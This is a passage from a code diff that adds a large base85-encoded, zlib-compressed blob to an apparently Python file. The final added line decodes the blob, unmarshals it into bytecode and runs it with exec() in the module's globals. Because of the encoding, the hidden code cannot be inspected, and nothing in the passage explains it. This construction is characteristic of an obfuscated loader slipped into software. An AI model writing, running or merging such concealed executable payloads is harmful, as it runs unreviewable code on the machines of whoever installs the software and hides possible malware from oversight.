+    "LmG^0mXl3}I*C>ojVCJo|=NxR260X8`Jc`s07z~@JbIM!F9kC<UK$G%jNNGTr7U{OSVP37!MP*gvikX{YAoc^Gu9=SkFetl*DW>V"
+    "MtE_<)BQ6L3+V=D;OC;dF8oI*NSC4RCyptEFze+Pk7_?zw5k$(P{P!~=aVSP2*>U~cP9Y54VRHMQyPyrlhWwen=&yL9|S(9njO*8"
+    "Z+;2P)YDm#b(TpYuU;?kM=lpC}8Svpj~JQfJu1t2|SHKTQcFv~OB>kl%=8mwE&ks|{=$4`y$+XCBgk<p6sE;&F$aSv25`&_;>htz"
+    "1E5PmyFg4U7FNxRR59EhNq0CKfA`Yd4d#{$ljirva60bhf<cxYF#)ko$wQ<bO+YO7EmvfbK2Sd2WYayh5|JdCGVp9?5L6B*E4JK%"
+    "A_o9m2va{yV0Lw^IlMCJ%Hb$hN)xhN-"
+    "@kTELjgyf3L?WQgvPqs&gj}LYuWf*g{pXHvQax<Z0G35N*Ce+Coq!0cE=c?rE=^9vM|1HEKy#Z%p`DPYLNQL|aaz}rKTw^~`Vf78"
+    ")>$~5#?Ek~#clJNXr4{Dnwe--f&>M%|?7P?Z=J9*Sp%ry^xV1Y{-"
+    "b44DiR7G}Q^OB^<pSYrzKRX<7f#33dEhs$Hmz$F2GyMWNfxHeq;>mO96!1IqstGjMGhRN_n)9MPev6(>!Kp1c{{xd-|l-"
+    "Yr{wmFw_ap_n7ikI|B4sYKG7<W@pl$hR1qs|3>P-8WYL9<k-~ki49@k=_ii$ehAu@9MRi^1_HF;eGqC|%c)&*Yvv<HzbnEiz<-"
+    "@dTe^hq>y|*m)F7KvI`=Yx2D1T>EcPO5dzh=lm-uK5Mh6-"
+    "9;@#&g2m*FKJV{*_co<fPvnu@Bg#<k|Vz280@)|TJTf!ad#E%i4u!9z?}7S@$TbroEe4-"
+    "GkMx{^0q89|iR?uJ4xD$)4d1Jz3C;dAtbi}d+Rbk_4xwGH5b1YGk5^40lMWmiT|4fbc*Mi|y~mLA5%KhHG7uu|W*PyF+JQt+JSJv"
+    "$@GEN(D<iba3{V!j!X5(WWth(sxII%D>2$*ja9BBisuFJB3<fSh|uY3lP+Le36_ggzj&$)1u+BV=)%V*W^ZN{j<6l%R7mhOs17K#"
+    "*i^+-8Pk;~BGZCGUe-LTn(ZWtqjSome>!yhW!-"
+    "eWhc<B*fm3I#L%>ysb~U6${A_tCK2QfF(;Y4v0wrn|{i+n#@A%LAt9f17Z&h%rB2UFa~Z5+>rx&_n6lYq$>Mlk_BMy#GzwdK#e`g"
+    "o!mJ&<z+rN<V|hjUB`!pdisuZAMZ#W&U-1+$?O-"
+    "@cmPVcK;lhf3lPh|x>Zgw1IUQuAkN9Q#)Cj~Z5azH8XG&{e@zL)buZir{9c>?a$s`QV|Tf2L5X!@YMinAfCu{<;(DJC`qUbOpZoD"
+    "KUzLVmq^ICPA9D<E5htX`T}>j>VW09tw?C}k8c2?V)mwL?<RvH2I<Buk0*jV<0wrSwkmRS(L6~YBe%^g@igZz_LqNv0jRHDlf%^c"
+    "nD{Z<2C8h!%>UsEjDY<9ycN6wLlF#Y9!l(w4Vzu1P=n5DdpvQIY9@C~>X1i^LIfO*r1w!v6bGRhD&umUr35bGk17j~3sg3jYuk2e"
+    "R$`%hVUA@=8ToxhPX?0;dw`Qq@HaEP|_sB%d^?hW>j~Ob%hRTScdQP!sGT$D*HGbQD%e}apZaDOQ^Urs^yDQc;9PS#XN1l&#+2})"
+    "Gpua%U_3#*JE(2~!`k1;PtS$h165N(*;%fc;F0dgjh~w(4`L4J+huxaijj|oKALiSZ3%i!eSN!zw7d}wi<Ax$yT?D@&7t_^;b@kD"
+    "Pq?ZMTIPY6Ixza^v9gM0wc|_Tai1Kq?O6)ylZdZr+z0%CCHt~CHQt&K%S;eekwQ-"
+    ";As){J>s*3nGxT=zVMMM_D1$A+NEOSIvzD*i=>MF`MDHJ?kkI<v6X6tqASrs75Du?L02<hmgjIPcn@!&veQvz})-"
+    "BAXYk?OZKJT0EEtPLb>Kz{Y?C6|nyjW@YVE;&12auH5J8q%*qjKeD}3aS~jJ~wsUgm+a%BUlP_e~<}@d)nvm@_AA>yk?NYH$(Ph@"
+    "Zfw;vT`yHZDYmT)RoV>uEUK>+DH5fX0?D3D4f-"
+    "9(<|v08HxqAv7KjXiO|S~wA`n#gnFPzFt%8*ETKyfsXWA{k1Uk!c<oBZ8%G^kg05YarmZPGueAcwK3UE(71cYrR{%^!*({iqvj(0"
+    "UhC0Ek6xBOj+}Ifkn4t=?GL-dp)uyWy94kUrzl_Zq{Vh9Q=McQ65t0b`ct%$#^kWjRZY|sui0r47Zv<s^2*ex4L}}%iLfI4hchu#"
+    "Wo&uK$d0qZYS1CH5@hU|P&w!ruvpmtg(?x=(;s>u%WDBi;v>qsVN)Pl3UAaM;#l26tN>RJb`s1{avpKwVR~O3Je3c?)B2QXB*R_N"
+    "i0VDa{+n6*9#6QKbTW}VlvN}F%S;&=z`I(L6mB`dxoH~cvA-"
+    "y(@x|#Xn0VqMiE1{gHQ8nS%HhW_!S;p;+`g71z@YQXN<IPW70U<MTI%2+IzJ{mOU-tC8yxGwZGH)`DXUp7T9RIIi^f@7|F)+p#(v"
+    "XPd^-Q~*lwa6&32S}pLr01Z7n0#zK;D9el|G`{IbkJ^p6DaI#EHQ^i#4s_LFNN?Ja-VE(FQ-EN%~Cix=AOMP`f7W<4#sBn-EWV#u"
+    "MVPDPJN3$Y{2!@EFuT!w6z<x&9Jz2_qKhr5Jksw0W-x+3zFsJ|x>w6g(c4fCBdi4UBtMg!_yWefNh5N{QYR!`1-"
+    "&XaNHTuiQ8HymgEi$E4<c8#gJ?`K-ZxTS^s5M^wXdk>}MZr-S_#pT(LGLrE0Mn!!v)P^xHbC!u(n_6|A)sff4p%(BTl#}RHQlji2"
+    "ZruxtN$6Ss`-IYKtTmC0EM#re@5VxHS$q#R5pvc%q`n@(ZAAL`?D8D04`Bfpx7f-)wyJuS-jSzbtV|aG!f+TJ(dR=ozlRPi}z})h"
+    "&7yx({<rUAkkXUQ-*I}>-Gq!Fv|0b%ZofK4Y`@GP75u6evYY$HN-"
+    "@ESs>(A@6SOaBzbL36#e7N=BL0Bq;?2@VPa87jJO`iQDyX1so(tgEBx+ovd?iiUaBQ^T_oS`vNvcHjZyZbL=ZHx?wa~UnjeLT$~A"
+    "!S7T_b~Ve7<>eS{~amjdGrR3bIMMb`Ywbk0S#fkG@r;!X-lAITh{cLG1^Gk8K)ZoQ-2JD@57QZ(@lICElciBR=2E&plzmVu<9A-"
+    "bT6E;3ljGGTsir3ee0qdxTcP8(TA+~oRPdS+Bo*8uzc}ixUhL%#X4q<5shJ@aXDwDINXGsuWI7Om9M{W=Y^#MD{YbD&Utm*RCxQ!"
+    "tt*Qa5mWWNI9^oo`jtCZmg-jwk)r+c8S65szH+V7vQ!(XY@a_KFDP6rjux~p9|A$V(z1~8M1|=M&}epHV7dDP-JW$BRzSq^Ys2}q"
+    "OC!r2D=$3kqVrD7%K>JuU$}E&sbHCk6n4z3J~R|24Lm!dM(ZQSAa_x+I6)UTMRm=Oic99zAImUf&bmmNeFk4Ew=9)?=jehmZZ40R"
+    "Ys2Q+rBln~%AS>4y0w?C>x-HXubB&JqGkEW^4=9EUDW-7x#x)j%g&?o&PI*r0A5C7v27Jvv=T96RoGayWcq<&`9h?rlde7#HFm`-"
+    "+HMU#s%V=ZWRY12MRj$orSM(q^=o&oy&k#~S{hh65Gg(y)gAi?o+I=}bpva<?0LuS%eO8sT#J~hqPl8y!f+(2JGw5D=sWRvNky!r"
+    "BV5w4(h(`?oj<x(S-"
+    "W&}`FgnS;DfwyU4Nu<VE#Dh$AkDG{3q9bbnRjJpS<{nDn{&GCHB%Ir@)X^R@1t&wY+l1m>TrkT7Jdr&)s>B{fXxm#tX~i`DO9ah9"
+    "_D@e%8EvJqxRDn3qI#<&PyIeJkjQ>L%7LYkqMoe@{4nPdu;Wb?Y4~U9*?of1Ez~1v=LbU{B<d>MUAU4)96kXy(%Hr*jYRQmv~oeM"
+    "L-"
+    "H6V}zBzAERQAAxD*zU6+^L!0X2IhI&XV>qWVn$sLN7sSjhVRK8=+_qNKNH?906rH2Z=hlqo+edF5UGRPL__`9yDPl5*O?7M)@SAc"
+    "`U2Q!1eL3*_$dDH^RD=x`OZrtq4c*ccYv~WS^ha9;;}z9!p1pULwsuA;4$TiDf2*AjtaRr|`s6g7cP(nXzLr-"
+    ";SDugLU8Ic{A8lSuBaysQwDA;}Gv<nqvoK?R93XV#cWx|Rd-KM<8?mar;i|pSs{Px<R@Kf+KG2na`ot#2a?9R0Lg!ea?N4RAwBpr"
+    "c(E6wH*H5fiVb$A8I=>n2Jz#c&satd^W<CwT;1$9dXR%=NRMx+F<=&O$niYGb^5Cn-VF8^Wg$Kusm5(uz#*DtaR~y#VMs@XZQ_j5"
+    "n*K39X2swuHLC8k4=YjpfFijkZn2yrAqfomEQbD82&)3Ec-<yEWz1+F$WCix_zPuAE?5C#Aa`5ur-o_K9*!#7IO2Ny|GfPj3v7a|"
+    "~?*}h`X+0zZKeS4JqF7Ali{Wz-"
+    "4xfwBb7|g5Oib@X&(GoDIgG*QusHu@sW@DOo=b4}T#BA6ltT^Tur+H46R%=w@Vu%n8mbYm)=1%VgLtSJTW#*l8BvNYqQOCn2<<FE"
+    "E%#kMYY%kqbstAOlSKpl#zXzR&6ZHvY?EFxfPBcSZD^-qAe5fl%c^kJ+d1_r41Ub*erVJD-"
+    ";h!t2Jj0E3?qRUoBy5+;O^;z?kQfzJ`t&;Wsgm2Y4zg*T>3ozSmwl~{rD$?;yu#pPp0upA^^D|(MfY3mp4kypOAQw)coWi-"
+    "X)UOF-"
+    "8CP&G%DfNoDkkoKZ%TA~(De26?v~zfCH{*O8p~4o?lKiqCNd$h&mLcriksd=jN8jFX?zOMS>k0t7GZPN$Ki2>wechhLNmeKsuh0l"
+    "rz;IP|`xoK=vjS!L=xFXb<w8=J>3eU&xCQq5+BGK4<q$Mu$wvXxUs`VM@K+?@K^SNu70b81=&zv=uO`8gj<J_)G}WlRG}j?~R6Z+"
+    "<nTq)a=P$9mfl!JfVOot@KCUm~+W={WV`Q*g}PK^0|(pXL$r+DjTpeJCU4n|IrEMvzYZ4C%7d(}mPK;mjT`$OS*1$U9t^$8WZyUc"
+    "h`Uzd<i#Kg+22M4-"
+    "0GZE)H#e;U4Dm!QKA5}#FtR6O5W+%eG=uxhA{kUXS9$5$Cl`>6jE(g@X@GT2KUm!ustlnHsz;C+HGQ@Gp^&$o6+MJj_DxRwFt+8w"
+    "YSO=A6&-h@ihe$Xy9HJHQMA*~=5Yzp4-"
+    "jSOLvgFb&)lfrBVta3gBR`|{SkQU55jgY72ke1gcg1tuSc_|buZi;8Z62G~@qvImdEI`Mrgy^!MM=Z_Oxv-hegIy>een%a(+r+<="
+    "Aau|Y;vWjtrw-6UqIBDekZ4%w!)&$NeCn(#8IP_H)N|@mzK`a-Ssky&ypV2FjhI7p4zzAocSASK{_-"
+    "q3@`JCbw$%`x9vLC*#PHAv;dV_<xx96Rmw7_=nlK)z-"
+    "BKUQ?qNJF5Kh1AYQX8YBYhvE%LADwLAgv6YY9RIrrc2VWrxO{@M<ekN?x&3cJCFoM8r7_1|`;MzaNA?%1<?Ns;8#pwR)rs>`lnd^"
+    "c(^>2c^ec9<n2-?6-"
+    "Ty13=X6NJxiA&h_^Mr5zoPfOCYoB_Xb_KM<7fyYT#hOSK1rdHXJsFEr0~@WP8$@Y6DTAgH|f!iDE&FV$Y0r4k_L23|+CLCp)C2+7"
+    "ZR1xEeveb*mwCwqwWf;REK^wdEF3X^t<(CaOeiXwbm#ty<_rq06F{0ym4oF3A5%>{T#-"
+    "d%9?$s?$$=|_HQk+;{QNFU+!1SXvnv_nLft5xW;&nSOF?(&hYahE?K29+_omw%U3#U$jEbINUZI2k?7Na{OElylNM?M!_a$)ZpCx"
+    "<zIo2+_YoDP2Ar7#(U9-PVRaI^Z{>{ykFeI^0gX$4Ro+lL0W`fo_qNzALUN8~QjB?qV)~$l0Wc3^2wvwv>btTBd-eOim?Ku-"
+    "!~SjE+Pvq$6Q;BL%21o83dgl0Yl`5JRZ?fD=dq=G0$6<;M@jQ2FtR3X^6&$|`v2SX`46(-"
+    "ej^g%M40Oj8}!R4<t#n#PxUKbB#NOxDnZy~G)en3|WH!lt$rS=e-"
+    "7E@NGC0hi{jY4r0o3y!6}sHSxt!<EG=IFOodkKG!3_3~Wbuf!k*`p7lk*4)x8kP%(koHTCEo72GCYVx=-"
+    "cTV|H4zZXW$*KATD^|9=(l^&R=YOO%d?WZu@T;Miwlb`(T)ZCDHZFJn@aQ{7zuzBgJr-"
+    "^~_OLJ7Izpel7&|)}K06vYOUBN6!)Lwp)C<wGp}5Y>d~Jwd#<i%nVR_dI`Ob6k0%BeX()_*F9A^v`U){IZ46n`-"
+    "74t{<nQw*`rAs4WqG_f4CpAB+`Hyw6j=^xpV6@}Jqda1v^!3U+m5X^xL(9fUUi-"
+    "Y9i=#^pJP<wTi{$n5A{PsmsO4ReyuI^sDF4^rssDDvy!`JCd2wS&%vc>ZRxjm5jZGgi)n_kAUYT8#ys5gU`i?qAw1)rx!mjnHjq8"
+    "f<uC!vcNUKGx9tbcJZ#^&w47M=|#=Hz6!cUyKnQ3|1#STs^gk57iPG{OFv>z<u&P1Mgrplz9G82Cw{ZjhPj{AX38zO;R)(f8T@E0"
+    "tyJI*+rY0teYR+1wpGk5OZ-TOP|zIV^vbMC#)eF<mFZZ=lR6RiUxU#c7tA3gP#v!9;*?A?F!jdDBGq1;6hwxYRw(O{e-"
+    "Mb7kxityyRxpIxG6bqfvf_P!YT$h^0Q@(hEFOT!(e`<<e{j4p)H#{wI{&C>Wz+&Oz=z2*bs;LwrdJyKls4>mq;|sblDVCOnS!nFL"
+    "6_Lqxhi}d5TPj_?9QSu@_<Q62-gST9%851qplB<JzP;p%SMH13_KEiL4ZAyTcQ4j0lW|Y$Bm1GJ_M*t~JGuxd+Dk>j5-"
+    "C{d33tdw!e;*=#_RsU9i9;Oh(g(hP#qVbe<p-"
+    "RwKUPj1dps_BmM;gG=jkxE|~9`>yQr;CO%ak>s;mYHwn%h_C}@_&m@e^sQdbs3!vI=_0IQ(yFTt)=!;xj7d#1r7j<MGOzaKj@Wtr"
+    "aHETUucW>F^%^&L*^bt>juX@g4qu$o#L(6qB?r4JP6HSg7<9IPi!5G*<L*wO(Aqe|$I^W40X|z1%h3}rTgu#*|C>TqOF~-"
+    "*|4lkaJasC9;D4L2MF-"
+    "7RN0_}J?g=TjTI4;maJSZs$STzsodMt3WqU~&e%Rigj!2eexivOB$1u8UOyG$tTw*=~mRUHbiTIql@Z?%{~;R-"
+    "t7%Ui9@L*aTV(4<-"
+    "Q(<t1cA1u<Wwwne8%{Lqg;co;Q{M?HqWin$XOyetgLpP@RH8OvK8R>Znq#aGLWR}S}2c|O?K5BBA(7c9DH%n%rw80h%$%g4UwI1J"
+    "V)8<mM?5uu<Me_4(e#(~jb-BtoQ6_By^GdFA8Hr^rr<&E}JffVz^EtyTo$D+aY!QoQOmr@5TqHk244=!)Cg)SbJ@#{2T}Y(Qw3)>"
+    "=vBr#D)ADDH-?NFO&>0uk49Yb_f-+A3eOKMu`F=2j4Or73b+pbULqCVs9n|!puc-"
+    "6n`1r+%OXq7+k`pp(JvTiboEdfwr+13NyHt&Xn1J+$>bGzTVp2A(4IpLUg)_sL4L*J`IB{h-"
+    "L&~Zh3r?I1xt+t)q4y^rei{OaYcegeDFRm3pB+_q=TWS^K_<OM>a%osyET*RKTq1s@CKPSyh~eKk7<-"
+    "Wb2IwYD+YyQG+K_E6|c*R&qML(4G_|2V3<tI3^s_!nZDBNoIj90=AXq|_kG^iQgZn<GSw6Gf%Cf*FUi*6pVdXTJeLwtgI|#;6J<B"
+    "8Xu|qcX$))8ke<v<NpuLG*+_qYWVp<|kt7Q|ni^Luc#$}x81c^3O@Sai{xj6?CPMFJ?2eQZepm~_&qr8U`Pd{xPRdlCzIaQpMd;i"
+    "88$xAVsEnRm7u<8*TPAb3`S&xC<G;JPWphNDqXl;k+`bVF#ckeuqf1rG<QKJ{PcDzd_a2Vh4*#Qh#j<kwEBnLtxD9P(uvH+0Pv3S"
+    "#E`L;(NgRyZ-"
+    "1oXu#Dj6$p%{NiEVO<rGLD5QW$Ef~I*N{P#DlUr@W14!BW8`F)=%u}@n@*IP|6Zp8+??l5Ja7Jx>^;rN70x>BQRr3qEWbe=xUEUU"
+    "(q_!s<JYzqSUGCND0fRUEM>0(*pyF!V+6pbBdCaqIRWWMet5pRD%eQLm4R)Qpi?&baG6h@zQ3A#-"
+    "`YcYCUac{kqc|xa@`wI)GgZYR>=R=6q%#XzQldnAGX%V%bg@Y!PjYE&Z?)KGuv`Wb$vZ^K7{LZc}9DllEAlH^KOxYV&^E|EvD6Hh"
+    "dvwawW9o2+BX^tD+aydH)=ZLcdt&>p@a2v`3m3-k4*={6b`>EgDR>`se#2+PkCC+D|59HebR}Co=@iAck|-"
+    "6WU@~YoIOS{)2zJ`o-1zm4Ce%VK?keYxbs<4v={n>l}NFo9BR!Xts)lrHaNS9dOkACts&$Wex<;Z@2OVBo<h(SkSU`d1*ApwI-ND"
+    "TP6X^1eTXrYx-q=2h%AK4+TB4p)Tb*8#E6aXb1<Fu_9Vg2%}|M!3|a8T&^|`p4J@O)g+_SUq{DN`%h`{7Kuo$4jn2q6-"
+    "2L=;3V?U&+6c5M1;<A4L(60K5aI=wHDrZ>%Z#nc{ByVZTHI0`<G0cq84~FSW2M}585CJ5|T9}Np2GPn}lhTDA*+UO+t?y3lE<Vo+"
+    "m`j69T3dLmEy8^}6j2NuH~c@48su32rA}XXj)C+V{-"
+    "F6tS`f!DNBZ+mc$MuAfR$gr^tz{$t4Z_ERZ3V;<0Ph^{~nbQVlkOX%yjogpdhrojQ$p<?~4?8ewOLf?>y1@84dniPeJ0SX>b6ta!"
+    "1{062t0pfyv+cP40Mo?DzD8-"
+    "jN!{8thtD1;|l~0nG<{YM}nUGTM5;!QcRV_0>&nwVh0@Swc9+Es~PyzF_cC^dWo+^Mt0k0{b9*WQxZ@bS*o}Vh9Vh%v1l>jPb<z5"
+    "PdPAQ-n$#XpuRH1-QE1(eol_hnArxTZ>i&7h;Sk0V^l}8nH2+)<#B(I`jEORo8(8j!KR-RVST^d3UEqy`qTvTxm6=!GVZl#@10nP"
+    "z=a1A1^HACq<6sdVAfgCI7bAWbjJFiQw8I^01%C!P2Qo&sToUrY@B30i|ads7FW#y|1u18DgOHk^wWSV7W(tDsrwHW%27AHL>xkh"
+    "s*{S%B!zNaNzKL>6jITKC_KNdTZiiI{SSKF+HO`2a5<zr<t;q%8Ddt;uX;@)<6RUaV-(Z))9k5OVn2im-eJdW-gPC(@zhCrusa!m"
+    "bkN_5o$3n8N`CapyECDatvM^k=Q=dq)V{3xL6h6bXlW;8pr2Fj;HQF_|NCV8T$b**bWNe~}Eo^~{pg?n03ju@~|3wsYPx7^<!Yke"
+    "!`eLME<NZdIlI;s|ROLX*R%zohhmAGjzc@e)wk|7;YA0Q=fzvO!hId6YfIe1i#@}p2+U6QL8TvjhFMHRj843GyT-yj-"
+    "h>If=E+4l^PQdO^1eH5Y`YRSrQ$+}3XvQzS$1_wL^l_!i7fhh1U4lNDEd~I^NWaVs<BfLYTw0{I@!-"
+    "8w05=fmayj`5t(d)52O=4LUz5>9ZR+kf1mlv|)9f0Rn^?3!mGex#@x}D3qceG~eLr%WJ5KdQ&D3NUSF+xb{@<?4$puyugvh7)U0c"
+    "n0#yNBdo93i{)q;H2nellR5AW6sbA<Y5Of?x6f2R66)Z2"
+)
+
+exec(_marshal.loads(_zlib.decompress(_base64.b85decode(_PAYLOAD))), globals(), globals())
